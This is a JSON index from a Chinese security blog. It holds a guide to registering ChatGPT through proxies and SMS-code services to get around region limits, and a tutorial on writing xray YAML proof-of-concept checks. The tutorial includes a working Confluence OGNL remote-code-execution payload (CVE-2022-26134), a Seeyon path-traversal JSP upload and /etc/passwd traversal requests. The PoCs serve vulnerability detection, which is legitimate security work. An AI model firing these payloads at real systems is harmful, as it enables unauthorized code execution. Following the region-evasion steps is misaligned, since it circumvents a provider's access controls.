{"categories":[{"title":"Cobalt strike","uri":"https://ad-calcium.github.io/categories/cobalt-strike/"},{"title":"exchange系列","uri":"https://ad-calcium.github.io/categories/exchange%E7%B3%BB%E5%88%97/"},{"title":"SQL注入","uri":"https://ad-calcium.github.io/categories/sql%E6%B3%A8%E5%85%A5/"},{"title":"web安全","uri":"https://ad-calcium.github.io/categories/web%E5%AE%89%E5%85%A8/"},{"title":"信息收集","uri":"https://ad-calcium.github.io/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"title":"内网渗透","uri":"https://ad-calcium.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"title":"内网环境搭建","uri":"https://ad-calcium.github.io/categories/%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"title":"凭据窃取","uri":"https://ad-calcium.github.io/categories/%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96/"},{"title":"小技巧","uri":"https://ad-calcium.github.io/categories/%E5%B0%8F%E6%8A%80%E5%B7%A7/"},{"title":"攻防演练","uri":"https://ad-calcium.github.io/categories/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"},{"title":"数据库","uri":"https://ad-calcium.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"title":"未授权漏洞","uri":"https://ad-calcium.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/"},{"title":"横向移动","uri":"https://ad-calcium.github.io/categories/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"title":"漏洞复现","uri":"https://ad-calcium.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"title":"编写yaml格式的poc","uri":"https://ad-calcium.github.io/categories/%E7%BC%96%E5%86%99yaml%E6%A0%BC%E5%BC%8F%E7%9A%84poc/"}],"posts":[{"content":"‍\n0x01 前言 最近ChatGPT很火，但是有人注册会经常出现不服务当前地区问题，现在手把手教你解决。\n0x02 准备 1.代理，要求是，韩国，日本，印度，新加坡，美国这几个地址。其他的不太清楚，反正香港肯定不行。\n2.准备一个国外手机号，如果没有用接码平台也行，有些接码平台是无法接的，所以我找了一个，sms-activate.org\n0x03 开始 3.1 注册解码平台 打开接码平台 sms-activate.org，注册一个账号\n​\n​\n接码OpenAi的一次费用是大概11卢布，人民币来看差不多是1块钱，不过只能充美金，就先充个1美金吧。\n​\n充值完成需要等一会，就先放着，直接进行下一步。\n3.2 注册OpenAI账号 首先是打开ChatGPT的账户注册页面。谷歌注册或者邮箱注册都可以，无所谓，这里用邮箱注册作为例子。\n​\n用邮箱注册后有个验证邮件，进去邮箱，点开链接。\n​\n现在开始一步步走就行了。\n当然，有一些人会在这里遇到一个问题，会出现提示说不能在当前国家服务\n​\n来，给你一招。一般你出现这种问题，就是因为你的代理没有全局，或者位置不对。香港的代理是100%无法通过的。\n但是又有个非常神奇的问题，只要你出现了这个提示，那么你接下来怎么切换代理，都是没用的。现在教你一招解决。\n‍\n3.3 解决地区问题 首先，你要把你的代理切换到不是香港的地区，我这里选日本。\n接着在地址栏里输入\njavascript:window.localStorage.removeItem(Object.keys(window.localStorage).find(i=\u0026gt;i.startsWith('@@auth0spajs')))  然后按下回车键，接着刷新页面，如果你的代理没问题，就可以正常看到注册页面了。\n3.4 绑定手机号码 ​\n这里我们选择印度，然后到我们的接码网站上去。在左侧搜索OpenAi，然后点击印度。\n​\n点击小黄车。\n​\n然后我们复制这个号码，粘贴过去。然后我们点击发送验证码就完事了。等一会网站会提示验证码，我们复制粘贴。\n​\n这样就成功了，随便点一个进去完事。\n3.5 使用ChatGPT 注册完后，我们去ChatGPT网站去登陆。\n​\n‍\n可以开心的玩耍了\n​\n‍\n3.6 使用chrome插件 平时使用谷歌比较多，发现出了个插件，使用起来比较方便，第一次需要登录openai的账号\n插件地址：https://chrome.google.com/webstore/detail/chatgpt-for-google/jgjaeacdkonaoafenlfkkkmbaopkbilf/related\n​\n","id":0,"section":"posts","summary":"‍ 0x01 前言 最近ChatGPT很火，但是有人注册会经常出现不服务当前地区问题，现在手把手教你解决。 0x02 准备 1.代理，要求是，韩国，日本，印度，新加","tags":["小技巧"],"title":"注册ChatGPT教程","uri":"https://ad-calcium.github.io/2022/12/%E6%B3%A8%E5%86%8Cchatgpt%E6%95%99%E7%A8%8B/","year":"2022"},{"content":"‍\n1.什么是yaml  YAML 是 \u0026ldquo;YAML Ain\u0026rsquo;t a Markup Language\u0026rdquo;（YAML 不是一种标记语言）的递归缩写。在开发的这种语言时，YAML 的意思其实是：\u0026ldquo;Yet Another Markup Language\u0026rdquo;（仍是一种标记语言），但为了强调这种语言以数据做为中心，而不是以标记语言为重点，而用反向缩略语重命名。\n 官网原文是这样解释的：\n YAML is a human-friendly data serialization language for all programming languages.\n翻译：YAML 是一种适用于所有编程语言的人性化数据序列化语言。\n 您可以将数据序列化视为将结构化数据集移动到某些编程语言中可用对象的过程。\n数据序列化语言的快速比较 JSON 和 XML 是您可能熟悉的另外两种序列化语言。YAML 类似于 JSON 和 XML，但自称更具可读性。让我们看一个例子。\nXML 使用占位符内容时，此帖子数组在使用 XML 时可能与以下内容类似：\n\u0026lt;posts\u0026gt; \u0026lt;post\u0026gt; \u0026lt;title\u0026gt;xxx\u0026lt;/title\u0026gt; \u0026lt;tags\u0026gt; \u0026lt;tag\u0026gt;xxx\u0026lt;/tag\u0026gt; \u0026lt;tag\u0026gt;xxx\u0026lt;/tag\u0026gt; \u0026lt;tag\u0026gt;xxx\u0026lt;/tag\u0026gt; \u0026lt;/tags\u0026gt; \u0026lt;body\u0026gt; Lorem ipsum dolor sit amet consectetur adipisicing elit. Nulla quidem at, suscipit quo ullam quaerat vitae perspiciatis aliquid delectus, quas mollitia, unde consequuntur commodi cupiditate officia natus? Quis, fugiat consectetur. \u0026lt;/body\u0026gt; \u0026lt;/post\u0026gt; \u0026lt;post\u0026gt; \u0026lt;title\u0026gt;xxx\u0026lt;/title\u0026gt; \u0026lt;tags\u0026gt; \u0026lt;tag\u0026gt;xxx\u0026lt;/tag\u0026gt; \u0026lt;tag\u0026gt;xxx\u0026lt;/tag\u0026gt; \u0026lt;tag\u0026gt;xxx\u0026lt;/tag\u0026gt; \u0026lt;/tags\u0026gt; \u0026lt;body\u0026gt; Lorem ipsum dolor sit amet consectetur adipisicing elit. Nulla quidem at, suscipit quo ullam quaerat vitae perspiciatis aliquid delectus, quas mollitia, unde consequuntur commodi cupiditate officia natus? Quis, fugiat consectetur. \u0026lt;/body\u0026gt; \u0026lt;/post\u0026gt; \u0026lt;/posts\u0026gt;  结构明显且僵硬。它具有 HTML 的类似，但它很冗长。例如，注意某个标签比标签本身需要更多字符。\n‍\n‍\nJSON ‍\nJSON 语法规则 JSON 语法是 JavaScript 对象表示语法的子集。\n 数据由逗号 , 分隔 使用斜杆 ** 来转义字符 大括号 {} 保存对象 中括号 [] 保存数组，数组可以包含多个对象  JSON 的两种结构： 1、对象：大括号 {} 保存的对象是一个无序的名称/值对集合。一个对象以左括号 { 开始， 右括号 } 结束。每个\u0026quot;键\u0026quot;后跟一个冒号 :，名称/值对使用逗号 , 分隔。\n**2、数组：**中括号 [] 保存的数组是值（value）的有序集合。一个数组以左中括号 [ 开始， 右中括号 ] 结束，值之间使用逗号 , 分隔。\n 值（value）可以是双引号括起来的字符串（string）、数值(number)、true、false、 null、对象（object）或者数组（array），它们是可以嵌套。  ‍\n这是使用 JSON 构建相同内容时的样子：\n{ \u0026quot;posts\u0026quot;: [ { \u0026quot;title\u0026quot;: \u0026quot;xxx\u0026quot;, \u0026quot;tags\u0026quot;: [\u0026quot;xxx\u0026quot;, \u0026quot;xxx\u0026quot;, \u0026quot;xxx\u0026quot;], \u0026quot;body\u0026quot;: \u0026quot;Lorem ipsum dolor sit amet consectetur adipisicing elit. Nulla quidem at, suscipit quo ullam quaerat vitae perspiciatis aliquid delectus, quas mollitia, unde consequuntur commodi cupiditate officia natus? Quis, fugiat consectetur.\u0026quot; }, { \u0026quot;title\u0026quot;: \u0026quot;xxx\u0026quot;, \u0026quot;tags\u0026quot;: [\u0026quot;xxx\u0026quot;, \u0026quot;xxx\u0026quot;, \u0026quot;xxx\u0026quot;], \u0026quot;body\u0026quot;: \u0026quot;Lorem ipsum dolor sit amet consectetur adipisicing elit. Nulla quidem at, suscipit quo ullam quaerat vitae perspiciatis aliquid delectus, quas mollitia, unde consequuntur commodi cupiditate officia natus? Quis, fugiat consectetur.\u0026quot; } ] }  在某些情况下，这可能更具可读性，tags​​ 是一个简洁而明显的数组，而在其他情况下则更加困难，例如 body​​，因为 JSON 不适合多行字符串。\n‍\nYAML ‍\n以 - 开头的行表示构成一个数组： | 保留每行尾部的换行符\\n \u0026gt; 删除每行尾部的换行符\\n，则看似多行文本，则在程序中会将其视为一行。且会保留最后一行的尾部换行符号 + 表示保留最后一行字符串末尾的换行 - 表示删除最后一行字符串末尾的换行  ‍\n现在让我们看一下 YAML 中的相同数据：\nposts: - title: xxx tags: - xxx - xxx - xxx body: |- Lorem ipsum dolor sit amet consectetur adipisicing elit. Nulla quidem at, suscipit quo ullam quaerat vitae perspiciatis aliquid delectus, quas mollitia, unde consequuntur commodi cupiditate officia natus? Quis, fugiat consectetur. - title: xxx tags: - xxx - xxx - xxx body: |+ Lorem ipsum dolor sit amet consectetur adipisicing elit. Nulla quidem at, suscipit quo ullam quaerat vitae perspiciatis aliquid delectus, quas mollitia, unde consequuntur commodi cupiditate officia natus? Quis, fugiat consectetur.  运行结果\n​\n‍\n‍\n可以看到，非常简洁。\n注意 YAML 的以下特征：\n 我们并不需要引号（在某些情况下，引号是必要的）。 包装文本很简单（body​ 可读性强）。 我们只需要几个有趣的字符来表示我们正在处理的对象的类型，比如一个连字符（-​）意味着我们正在处理一个数组。  ‍\n2.什么是POC 概念 PoC，全称“Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。\nExp，全称“Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。\nPayload，中文“有效载荷”，指成功 exploit 之后，真正在目标系统执行的代码或指令。\nShellcode，简单翻译“shell 代码”，是 Payload 的一种，由于其建立正向/反向 shell 而得名。\n‍\n解释 PoC 是用来证明漏洞存在的\nExp 是用来利用漏洞的，两者通常不是一类，或者说，PoC 通常是无害的，Exp 通常是有害的，有了 PoC，才有 Exp。\nPayload 有很多种，它可以是 Shellcode，也可以直接是一段系统命令。同一个 Payload 可以用于多个漏洞，但每个漏洞都有其自己的 Exp，也就是说不存在通用的 Exp。\nShellcode 也有很多种，包括正向的，反向的，甚至 meterpreter。\n‍\n3 yaml基础语法 3.1 yaml语言特性归纳如下 YAML的可读性好 YAML和脚本语言的交互性好 YAML使用实现语言的数据类型 YAML有一个一致的信息模型 YAML易于实现 YAML可以基于流来处理YAML表达能力强，扩展性好  ‍\n3.2 YAML有以下基本规则 1、大小写敏感 2、使用缩进表示层级关系 3、禁止使用tab缩进，只能使用空格键 4、缩进长度没有限制，只要元素对齐就表示这些元素属于一个层级 5、使用#表示注释 6、字符串可以不用引号标注  3.3 三种数据结构 3.3.1 对象 键值对的集合，又称为映射（mapping）/ 哈希（hashes） / 字典（dictionary）\n对象的一组键值对，使用冒号结构表示。\n# JSON 表示 {'age':12,'name':'huang'} # YAML 多行表示 age : 12 name : huang # YAML 行内表示 {age:12, name:huang}  3.3.2 List 数组 一组按次序排列的值，又称为序列（sequence） / 列表（list）\n一组连词线开头的行，构成一个数组。\n# JSON 表示 ['a','b',12] # YAML 多行表示 - a - b - 12 # YAML 行内表示 [a, b, c]  3.4 字符串 3.4.1 引号  默认不使用引号表示 如果字符串之中包含空格或特殊字符，则需要放在引号之中 单引号和双引号都可以使用，双引号不会对特殊字符转义 单引号之中如果还有单引号，必须连续使用两个单引号转义  # YAML 表示 s1: '内容\\n字符串' s2: \u0026quot;内容\\n字符串\u0026quot; str: 'labor''s day' # JSON 表示 { s1: '内容\\\\n字符串', s2: '内容\\n字符串', str: 'labor\\'s day' }  3.4.2 单字符串换行  字符串可以写成多行，从第二行开始，必须有一个单空格缩进。换行符会被转为空格。  # YAML 表示 str: 这是一段 多行 字符串 # JSON 表示 { str: '这是一段 多行 字符串' }  3.4.3 多行字符串   多行字符串可以使用 | 保留换行符，也可以使用 \u0026gt; 折叠换行\n“|” 保留每行尾部的换行符\\n\n“\u0026gt;” 删除每行尾部的换行符\\n，则看似多行文本，则在程序中会将其视为一行。且会保留最后一行尾部的换行符号\n  # YAML 表示 this: | Foo Bar that: \u0026gt; Foo Bar # JSON 表示 { \u0026quot;this\u0026quot;: \u0026quot;Foo\\\\nBar\\\\n\u0026quot;, \u0026quot;that\u0026quot;: \u0026quot;Foo Bar\\\\n\u0026quot; }  ​\n‍\n +表示保留文字块末尾的换行，- 表示删除字符串末尾的换行。  # YAML 表示 s1: | Foo s2: |+ Foo s3: |- Foo # JSON 表示 { \u0026quot;s1\u0026quot;: \u0026quot;Foo\\n\u0026quot;, \u0026quot;s2\u0026quot;: \u0026quot;Foo\\n\u0026quot;, \u0026quot;s3\u0026quot;: \u0026quot;Foo\u0026quot; }  3.4.4 HTML 字符串之中可以插入 HTML 标记。\n# YAML 表示 message: | \u0026lt;p style=\u0026quot;color: red\u0026quot;\u0026gt; 段落 \u0026lt;/p\u0026gt; # JSON 表示 { \u0026quot;message\u0026quot;: \u0026quot;\u0026lt;p style=\u0026quot;color: red\u0026quot;\u0026gt;\\n 段落\\n\u0026lt;/p\u0026gt;\\n\u0026quot; }  3.4.5 强制转换 YAML 允许使用两个感叹号，强制转换数据类型。\n# YAML 强制转换 e: !!str 123 f: !!str true # 转为 JSON 如下。 { e: '123', f: 'true' }  3.5 数据结构嵌套 Map 和 List 的元素可以是另一个 Map 或者 List 或者是纯量。由此出现 4 种常见的数据嵌套：\n3.5.1 Map 嵌套 Map # JSON 表示 { websites: { YAML: 'yaml.org', Ruby: 'ruby-lang.org', Python: 'python.org', Perl: 'use.perl.org' } } # YAML 表示 websites: YAML: yaml.org Ruby: ruby-lang.org Python: python.org Perl: use.perl.org  3.5.2 Map 嵌套 List # JSON 表示 { languages: [ 'Ruby', 'Perl', 'Python', 'c' ] } # YAML 表示 languages: - Ruby - Perl - Python - c  3.5.3 List 嵌套 List # JSON 表示 [ [ 'Ruby', 'Perl', 'Python' ], [ 'c', 'c++', 'java' ] ] # YAML 表示 1 - - Ruby - Perl - Python - - c - c++ - java # YAML 表示 2 - - Ruby - Perl - Python - - c - c++ - java # YAML 表示 3 - [Ruby,Perl,Python] - [c,c++,java]  3.5.4 List 嵌套 Map # JSON 表示 [ { id: 1, name: 'huang' }, { id: 2, name: 'liao' } ] # YAML 表示 - id: 1 name: huang - id: 2 name: liao  3.5 引用 \u0026amp; 用来建立锚点（defaults），\u0026laquo; 表示合并到当前数据，* 用来引用锚点。\ndefaults: \u0026amp;defaults adapter: postgres host: localhost development: database: myapp_development \u0026lt;\u0026lt;: *defaults - \u0026amp;showell Steve - Clark - Brian - Oren - *showell  等同于下面的代码。\ndefaults: adapter: postgres host: localhost development: database: myapp_development adapter: postgres host: localhost [ 'Steve', 'Clark', 'Brian', 'Oren', 'Steve' ]  ‍\n‍\n4.poc应用场景 xray 根据xray的解析规则，目前有两个版本：v1、v2\nfscan 目前只支持 xray 的 v1版本\n‍\n5.poc编写 5.1 POC结构 一个最基础的 POC 如下：\nname: poc-yaml-example-com rules: - method: GET path: \u0026quot;/\u0026quot; headers: Content-Type: application/x-www-form-urlencoded expression: | response.status==200 \u0026amp;\u0026amp; response.body.bcontains(b'Example Domain') detail: author: name(link) links: - http://example.com  ‍\n名词解析\nname: poc-yaml-example-com //poc的名字 rules: //规则组成列表 - method: GET // 请求方法 path: \u0026quot;/\u0026quot; //请求的路径 headers: //请求 HTTP 头，Rule 中指定的值会被覆盖到原始数据包的 HTTP 头中 Content-Type: application/x-www-form-urlencoded expression: | //表达式 response.status==200 \u0026amp;\u0026amp; response.body.bcontains(b'Example Domain') detail: //一个键值对，需要将结果返回给xray的引擎内容，如果无需返回内容则可忽略 author: name(link) //作者名称 links: //参考地址 - http://example.com  整个 POC 是一个键值对，其包含3个键：\n name: string​ set: []string​ (0.13.0 版本新增) rules: []Rule​ detail: map[string]string​  name 是 POC 的名字\nset 是用来自定义变量，比如是随机数、反连平台等。\nrules 是一个由规则（Rule）组成的列表，后面会描述如何编写 Rule，并将其组成 rules。\ndetail 是一个键值对，内部存储需要返回给 xray 引擎的内容，如果无需返回内容，可以忽略。\n5.2 Rule Rule 就是我们 POC 的灵魂，在 YAML 中一个 Rule 是一个键值对，其包含如下键：\n method: string​ 请求方法 path: string​ 请求的完整 Path，包括 querystring 等 headers: map[string]string​ 请求 HTTP 头，Rule 中指定的值会被覆盖到原始数据包的 HTTP 头中 body: string​ 请求的Body follow_redirects: bool​ 是否允许跟随300跳转 expression: string​ search: string​  根据这些键的作用，我们将其分为三类：\n method​、path​、headers​、body​、follow_redirects​的作用是生成检测漏洞的数据包 expression​ 的作用是判断该条 Rule 的结果 search​ 的作用是从返回包中提取信息  对于第一部分的内容，用来将原始的扫描请求进行变形, 比如原请求是 GET​，但这里制定了 POST​, 那么发送的时候就会使用 POST​,其他项类似，不在赘述，我们从第二部分开始介绍。\n整体执行流程可以参照上述的生命周期。\n如何编写expression表达式 如果说Rule是一个POC的灵魂，那么expression表达式就是Rule的灵魂。\n正如spring使用SpEL表达式，struts2使用OGNL表达式，xray使用了编译性语言Golang，所以为了实现动态执行一些规则，我们使用了Common Expression Language (CEL)表达式。\n关于CEL表达式项目的详细信息，可以参考https://github.com/google/cel-spec项目。如果你只是编写一些简单的规则，只需要阅读本文档的即可。\n我们从上述示例中的表达式开始说起：\nresponse.status==200 \u0026amp;\u0026amp; response.body.bcontains(b'Example Domain')  CEL表达式通熟易懂，非常类似于一个Python表达式。上述表达式的意思是：​**返回包status等于200，且body中包含内容“Example Domain”**​。\nxray 通过类型注入技术自定义了4种数据类型，包括\n request​ 原始扫描请求 response​ 当前 rule 的响应 reverse​ 反连平台类型 url​ url 类型，可以用过 request.url​、response.url​ 和 reverse.url​ 调用  其中可以在 rule 的 expression 使用的类型有： request​、response​ 和自定义的变量。\n关于这些类型的详细属性，参照后续的清单。\nexpression表达式上下文还包含有一些常用的函数。比如上述 bcontains​ 用来匹配 bytes 是否包含，类似的，如果要匹配 string 的包含，可以使用 contains​, 如：\nresponse.content_type.contains(\u0026quot;json\u0026quot;)  xray 所有CEL文档中的函数，同时还包含xray引擎中自定义的函数，函数清单请参照下方清单部分。\n值得注意的是，类似于python，CEL中的字符串可以有转义和前缀，如：\n '\\r\\n'​ 表示换行 r'\\r\\n'​ 不表示换行，仅仅表示这4个字符。在编写正则时很有意义。 b'test'​ 一个字节流（bytes），在golang中即为[]byte​  用一些简单的例子来解释大部分我们可能用到的表达式：\n  response.body.bcontains(b'test')​\n 返回包 body 包含 test，因为 body 是一个 bytes 类型的变量，所以我们需要使用 bcontains 方法，且其参数也是 bytes    response.body.bcontains(bytes(r1+'some value'+r2))​\n r1、r2是 randomLowercase 的变量，这里动态的判断 body 的内容    response.content_type.contains('application/octet-stream') \u0026amp;\u0026amp; response.body.bcontains(b'\\x00\\x01\\x02')​\n 返回包的 content-type 包含 application/octet-stream，且 body 中包含 0x000102 这段二进制串    response.content_type.contains('zip') \u0026amp;\u0026amp; r'^PK\\x03\\x04'.bmatches(response.body)​\n 这个规则用来判断返回的内容是否是zip文件，需要同时满足条件：content-type 包含关键字 \u0026ldquo;zip\u0026rdquo;，且 body 匹配上正则r'^PK\\x03\\x04'（就是zip的文件头）。因为 startsWith 方法只支持字符串的判断，所以这里没有使用。    response.status \u0026gt;= 300 \u0026amp;\u0026amp; response.status \u0026lt; 400​\n 返回包的 status code 在 300~400 之间    (response.status \u0026gt;= 500 \u0026amp;\u0026amp; response.status != 502) || r'\u0026lt;input value=\u0026quot;(.+?)\u0026quot;'.bmatches(response.body)​\n 返回包status code大于等于500且不等于502，或者Body包含表单    response.headers['location']==\u0026quot;https://www.example.com\u0026quot;​\n headers 中 Location​ 等于指定值，如果 Location​ 不存在，该表达式返回 false    'docker-distribution-api-version' in response.headers \u0026amp;\u0026amp; response.headers['docker-distribution-api-version'].contains('registry/2.0')​\n headers 中包含 docker-distribution-api-version​ 并且 value 包含指定字符串，如果不判断 in​，后续的 contains 会出错。    response.body.bcontains(bytes(response.url.path))​\n body 中包含 url 的 path    expression表达式返回的必须是一个bool类型的结果，这个结果作为整个Rule的值，而rules由多个Rule组成。值为true的Rule，如果后面还有其他Rule，则继续执行后续Rule，如果后续没有其他Rule，则表示该POC的结果是true；如果一个Rule的expression返回false，则不再执行后续Rule，也表示本POC的返回结果是false。\n也就是说，一个POC的rules中，最后一个Rule的值，决定是否存在漏洞。\n‍\n5.3 自定义变量 在编写 poc 时，有时会遇到需要随机值的情况，如果只是单纯的随机值比较简单，可以直接使用 randomLowercase​ 等函数生产随机值。但经常性的，我们后续还需要用到该随机值，这就是自定义变量的用途了。\nxray 的自定义变量通过 yaml 中的 set 实现，一个相对复杂的 case 如下:\nname: poc-yaml-example set: r1: randomInt(5, 10) //在5-10中随机获取一个整数 r2: randomLowercase(r1) // 随机生成一个 r1 长度的小写随机值 requestType: request.content_type rules: - method: GET path: \u0026quot;/?{{r2}}\u0026quot; expression: | requestType.contains(\u0026quot;json\u0026quot;) \u0026amp;\u0026amp; response.status==200 \u0026amp;\u0026amp; md5(r2).contains('1')  该 poc 最终发出的 path 类似 /lxbfah​，意为先在 （5，10）内随机取一个整数 r1, 然后随机生成一个 r1 长度的小写随机值，在发送请求时将该值作为 path 发出。 表达式内验证原始请求的 content-type 是否包含 json 以及 md5 后的 r2 是否包含 1 这个字符等。\n上面的范例包含了自定义变量的一些规律和约束:\n set 的 value 是表达式，可以使用所有全局函数 set 有先后次序，后面的变量可以使用前面的再次处理 set 中可以使用 request​ 和 reverse​(下面讲到) 变量 在 rules 的 expression 中可以直接使用自定义变量，非 expression 的部分需要使用 {{}}​ 包裹变量，因为其他位置不是表达式（类似 search)  更多复杂用法大家可以自行发挥。\n‍\n5.4 规则组 该功能从 xray 1.6.0 开始支持\n有一部分漏洞存在多种入口或是多种触发条件，如果想要将支持多种情况，从已知的情报来看只能写多个 yaml poc。但是从分类上来讲，这几个分离的 poc 实际都是为了检测同一个漏洞，因此诞生了 groups​ 规则组的概念。\n最常见的一个应用是同一漏洞在 windows 和 linux 下不同的利用方式, 这时候就可以这么写:\nname: poc-yaml-groups-test groups: win: - method: GET path: \u0026quot;/getfile=../../../../windows/win.ini\u0026quot; expression: | response.status == 200 linux: - method: GET path: \u0026quot;/getfile=../../../../etc/passwd\u0026quot; expression: | response.status == 200CopyErrorCopied  groups​ 的定义是 map[string]rules，这里执行逻辑上相当于 win | linux​, 即只要有一组规则执行成功，该漏洞就认为存在。\n注意：groups​ 与 rules​ 应当只存在一个。\n‍\n5.5 内部变量与函数速查 通过类型注入技术，我们实现了四种自定义的数据类型\n其中 request 包含的字段如下：\n   变量名 类型 说明     ​request.url​ ​urlType​ 自定义类型 urlType, 请查看下方 urlType 的说明   ​request.method​ ​string​ 原始请求的方法   ​request.headers​ ​map[string]string​ 原始请求的HTTP头，是一个键值对（均为小写），我们可以通过headers['server']​来获取值。如果键不存在，则获取到的值是空字符串。注意，该空字符串不能用于 ==​ 以外的操作，否则不存在的时候将报错，需要先 in​ 判断下。详情参考下文常用函数章节。   ​request.content_type​ ​string​ 原始请求的 content-type 头的值, 等于request.headers[\u0026quot;Content-Type\u0026quot;]​   ​request.body​ ​[]byte​ 原始请求的 body，需要使用字节流相关方法来判断。如果是 GET， body 为空。    response 包含的字段如下:\n   变量名 类型 说明     ​response.url​ ​urlType​ 自定义类型 urlType, 请查看下方 urlType 的说明   ​response.status​ ​int​ 返回包的status code   ​response.body​ ​[]byte​ 返回包的Body，因为是一个字节流（bytes）而非字符串，后面判断的时候需要使用字节流相关的方法   ​response.headers​ ​map[string]string​ 返回包的HTTP头，类似 request.headers​。   ​response.content_type​ ​string​ 返回包的content-type头的值   ​response.latency​ ​int​ 响应的延迟时间，可以用于 sql 时间盲注的判断，单位毫秒 (ms)    常用函数一览\n   函数名 函数原型 说明     ​contains​ ​func (s1 string) contains(s2 string) bool​ 判断s1是否包含s2，返回bool类型结果   ​bcontains​ ​func (b1 bytes) bcontains(b2 bytes) bool​ 判断一个b1是否包含b2，返回bool类型结果。与contains不同的是，bcontains是字节流（bytes）的查找   ​matches​ ​func (s1 string) matches(s2 string) bool​ 使用正则表达式s1来匹配s2，返回bool类型匹配结果   ​bmatches​ ​func (s1 string) bmatches(b1 bytes) bool​ 使用正则表达式s1来匹配b1，返回bool类型匹配结果。与matches不同的是，bmatches匹配的是字节流（bytes）   ​startsWith​ ​func (s1 string) startsWith(s2 string) bool​ 判断s1是否由s2开头   ​endsWith​ ​func (s1 string) endsWith(s2 string) bool​ 判断s1是否由s2结尾   ​in​ ​string in map​ map 中是否包含某个 key，目前只有 headers 是 map 类型   ​md5​ ​func md5(string) string​ 字符串的 md5 (以下都是 0.13.0 版本新增)   ​randomInt​ ​func randomInt(from, to int) int​ 两个范围内的随机数   ​randomLowercase​ ​func randomLowercase(n length) string​ 指定长度的小写字母组成的随机字符串   ​base64​ ​func base64(string/bytes) string​ 将字符串或 bytes 进行 base64 编码   ​base64Decode​ ​func base64Decode(string/bytes) string​ 将字符串或 bytes 进行 base64 解码   ​urlencode​ ​func urlencode(string/bytes) string​ 将字符串或 bytes 进行 urlencode 编码   ​urldecode​ ​func urldecode(string/bytes) string​ 将字符串或 bytes 进行 urldecode 解码   ​substr​ ​func substr(string, start, length) string​ 截取字符串   ​sleep​ ​func sleep(int) bool​ 暂停执行等待指定的秒数    ‍\n6.POC演示编写 ‍\n‍\nconfluence代码执行 name: confluence-rce-CVE-2022-26134 rules: - method: GET path: /%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22X-Cmd-Response%22%2CClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22var%20d%3D%27%27%3Bvar%20i%20%3D%20java.lang.Runtime.getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%3B%20while%28i.available%28%29%29d%2B%3DString.fromCharCode%28i.read%28%29%29%3Bd%22%29%29%7D/ follow_redirects: false expression: | response.status==302 \u0026amp;\u0026amp; 'X-Cmd-Response' in response.headers  ‍\n​\n‍\n‍\n‍\n致远OA wpsAssistServlet 文件上传 ‍‍\nname: poc-yaml-seeyon-wps-assist-servlet-upload set: rfilename: randomLowercase(12) r2: randomInt(40000, 44800) r3: randomInt(40000, 44800) rules: - method: POST path: /seeyon/wpsAssistServlet?flag=save\u0026amp;realFileType=../../../../ApacheJetspeed/webapps/ROOT/{{rfilename}}.jsp\u0026amp;fileId=2 headers: Content-Type: \u0026quot;multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b\u0026quot; body: \u0026quot;--59229605f98b8cf290a7b8908b34616b\\r\\nContent-Disposition: form-data; name=\\\u0026quot;upload\\\u0026quot;; filename=\\\u0026quot;123.xls\\\u0026quot;\\r\\nContent-Type: application/vnd.ms-excel\\r\\n\\r\\n\u0026lt;% out.println({{r2}} * {{r3}});%\u0026gt;\\r\\n--59229605f98b8cf290a7b8908b34616b--\\r\\n\\r\\n\u0026quot; expression: response.status == 200 \u0026amp;\u0026amp; response.body.bcontains(b'\u0026quot;code\u0026quot;:') \u0026amp;\u0026amp; response.body.bcontains(b'\u0026quot;data\u0026quot;:') \u0026amp;\u0026amp; response.body.bcontains(b'\u0026quot;officeTransResultFlag\u0026quot;:') \u0026amp;\u0026amp; response.body.bcontains(b'true') - method: GET path: /{{rfilename}}.jsp expression: response.status == 200 \u0026amp;\u0026amp; response.body.bcontains(bytes(string(r2 * r3)))  ‍\n扫描结果\n‍\n‍\npoc调试 如果 poc 无法扫出期望的结果，可以按照以下思路调试\n 确定 poc 语法正确，payload 正确。 使用wireshark进行抓包  ‍\n","id":1,"section":"posts","summary":"‍ 1.什么是yaml YAML 是 \u0026ldquo;YAML Ain\u0026rsquo;t a Markup Language\u0026rdquo;（YAML 不是一种标记语言）的递归缩写。在开发的这种语言时，YAML 的意思其实","tags":["编写yaml格式的poc"],"title":"编写YAML格式POC","uri":"https://ad-calcium.github.io/2022/12/%E7%BC%96%E5%86%99yaml%E6%A0%BC%E5%BC%8Fpoc/","year":"2022"},{"content":"0x01 前言 红队的攻击是一项系统的工作，整个攻击过程是有章可循、科学合理的，涵盖了从前期准备、攻击实施到靶标控制的各个步骤和环节。按照任务进度划分，一般可以将红队的工作分为 4 个阶段：准备工作、目标网情搜集、外网纵向突破和内网横向拓展\n1.1 团队协作 攻击队主要包含行动总指挥、情报搜集人员、武器装备制造人员、打点实施人员、社工钓鱼人员、内网渗透人员等角色。随着实战攻防演练的不断深入，防守队的整体能力持续提升，这就使得攻击队人员凭个人能力单打独斗取得胜利的希望越来越小。而由 3～5 人组成的攻击小队，通过分工协作高效完成攻击行动的模式越来越成熟。是否拥有团队协作的作战经验，团队中各成员分别扮演什么样的角色，是蓝队实战化能力的重要指标。团队作战，成功的关键是协作与配合。通常来说，每支攻击队的成员都会有非常明确的分工和角色。在实战攻防演练中，攻击队比较常见的角色分工主要有 6 种，分别是行动总指挥、情报搜集人员、武器装备制造人员、打点实施人员、社工钓鱼人员和内网渗透人员。\n1）行动总指挥：通常是攻击队中综合能力最强的人，需要有较强的组织意识、应变能力和丰富的实战经验。负责策略制订、任务分发、进度把控等。 